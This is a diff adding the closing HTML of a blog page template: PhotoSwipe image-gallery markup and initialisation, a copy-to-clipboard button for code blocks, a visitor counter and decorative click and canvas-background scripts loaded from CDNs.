+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+<!-- 三角彩带背景 -->
+  <canvas id="evanyou-canvas" style="opacity: 0.3; position: fixed; top: 0px; left: 0px; z-index: -1; width: 100%; height: 100%; pointer-events: none;"></canvas>
+  <script src="https://cdn.jsdelivr.net/gh/XXXZhy/Blog_Image/js/evanyou_canvas.js"></script>
+</html>
